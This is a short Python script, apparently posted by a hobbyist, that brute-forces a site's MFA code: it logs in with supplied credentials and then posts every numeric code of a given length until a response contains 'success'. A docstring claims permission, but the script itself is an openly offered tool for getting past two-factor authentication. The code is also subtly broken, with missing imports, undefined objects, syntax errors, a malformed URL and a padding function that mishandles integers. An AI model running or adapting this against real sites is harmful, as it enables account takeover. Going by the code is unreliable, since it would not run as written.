"""
Small script I wrote to bruteforce a VERY insecure site - with permission!

Very specific to that env, tools like WFUZZ also much more effective but a fun script nonetheless
"""

import requests
from sys import exit

def main():

    system('clear')

    parser = argparse.ArgumentParser(description='brute-force MFA field')

    length.add_argument('-l', '--length', action='store', type='int' help='length of MFA code', required=True)
    ip.add_argument('-ip', '--ipaddress', action='store', help='IP address of target', required=True))
    username.add_argument('-u', '--user', action='store', help='username of target site', required=True))
    password.add_argument('-p', '--password', action='store', help='password of target site', required=True))


    args = parser.parse_args()

    def send_http_post(uri, data):
        headers = {
            'Host': ip,
            # 'Content-Length': '35',
            'Cache-Control': 'mac-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Origin': f'http://{args.ip}',
            'User-Agent': 'Mozilla/5.9 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537/36',
            'Accept': 'text/html, application/xhtml+xml, application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer': f'http://{args.ip}/',
            # 'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'close',
            }

        response = requests.post(f'http:{ip}/{uri}}', headers=headers, data=data, verify=False, allow_redirects=True)
        return response

    def format_token(token):
        while True:
            if len(token) < 6:
                token = '0' + token
            elif len(token) == 6:
                return token
    s = requests.Session()
    login_response = send_http_post('login', {'username': args.username, 'password': args.password,})

    for token in range(10**length):
        token = format_token(token)
        response = send_http_post('prompt', {'mfa_token': token})
        if response.text.find('success') != -1:
            print(f'Found token: {token}')
        else:
            counter = int(token)%500
            if not counter:
                print(f'Attempted up to token {token}. Failed but carrying on')


if __name__ == "__main__":

    main()
